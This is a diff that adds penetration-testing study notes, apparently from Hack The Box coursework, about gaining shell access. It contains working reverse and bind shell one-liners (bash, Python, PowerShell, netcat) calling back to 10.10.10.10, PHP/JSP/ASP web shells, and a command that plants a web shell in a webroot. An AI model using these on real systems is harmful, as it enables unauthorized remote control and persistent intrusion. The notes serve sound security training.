@@ -145,6 +145,89 @@ Projects/
    - Check server vulnerability: `check`  
    - Run/exploit: `exploit`
 
+- One way to connect to compromised systems is through:
+  - **SSH** for Linux
+  - **WinRM** for Windows  
+  These allow remote login.
+
+- **Reverse Shells**:
+  - Used after identifying a vulnerability.
+  - Characteristics: Quick, Reliable, Fragile — if the connection is lost, the exploit must be run again.
+  - Start a Netcat listener on our port:  
+    `nc -lvnp 1234`
+  - Flags:
+    - `-l` — Listen mode, to wait for a connection.
+    - `-v` — Verbose mode, so we know when a connection is received.
+    - `-n` — Disable DNS resolution for faster connections.
+    - `-p 1234` — Port number Netcat listens on.
+  - Connect‑back IP:
+    - `ip a`  
+    - `tun0` for HTB  
+    - `eth0` for real scenarios
+  - Reliable reverse connection for bash:
+    - `bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'`
+    - `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f`
+  - Reliable reverse connection for PowerShell:
+    - `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"`
+
+- **Bind Shells** (we connect to it):
+  - Listens on port 1234 with IP `0.0.0.0` — connect from anywhere.
+  - Start bind shell:
+    - Bash:  
+      `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f`
+    - Python:  
+      `python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'`
+    - PowerShell:  
+      `powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();`
+  - Connect to bind shell:  
+    `nc 10.10.10.1 1234`
+
+- **Upgrade TTY in Netcat Shell**:
+  1. `python -c 'import pty; pty.spawn("/bin/bash")'`
+  2. Press `Ctrl + Z`
+  3. `stty raw -echo`
+  4. `fg`
+  5. Press Enter (or type `reset` then Enter)
+  6. Get terminal variables:
+     - `echo $TERM`
+     - `stty size`
+  7. Apply terminal settings:
+     - `export TERM=xterm-256color`
+     - `stty rows 67 columns 318`
+
+- **Web Shells (PHP, ASPX, JSP)**:
+  - Use HTTP request parameters like GET or POST.
+  - PHP web shell:  
+    `<?php system($_REQUEST["cmd"]); ?>`
+  - JSP web shell:  
+    `<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`
+  - ASP web shell:  
+    `<% eval request("cmd") %>`
+
+- **Uploading a Web Shell**:
+  1. Identify the webroot:
+
+     | Web Server | Default Webroot |
+     |------------|-----------------|
+     | Apache     | /var/www/html/  |
+     | Nginx      | /usr/local/nginx/html/ |
+     | IIS        | c:\inetpub\wwwroot\ |
+     | XAMPP      | C:\xampp\htdocs\ |
+
+  2. Write the web shell using echo:  
+     `echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php`
+
+- **Accessing the Web Shell**:
+  - Browser:  
+    `http://SERVER_IP:PORT/shell.php?cmd=id`
+  - cURL:  
+    `curl http://SERVER_IP:PORT/shell.php?cmd=id`
+
+  - **Benefits**:
+    - Can bypass firewalls.
+    - If the compromised host reboots, the web shell remains.
+    - Accessible anytime as long as the file stays in place.
+
 ## Key Concepts
 - Linux systems & utility tools  
 - SSH  
@@ -156,4 +239,6 @@ Projects/
 - Web Enumeration Techniques: Gobuster, HTTP status codes, cURL, WhatWeb, SSL/TLS certificate, robots.txt, source code.
 - Public exploit discovery and validation.
 - Using Metasploit for vulnerability assessment.
+- Shell access methods (reverse, bind, web shells)
+- Improving shell usability (TTY upgrades)
 
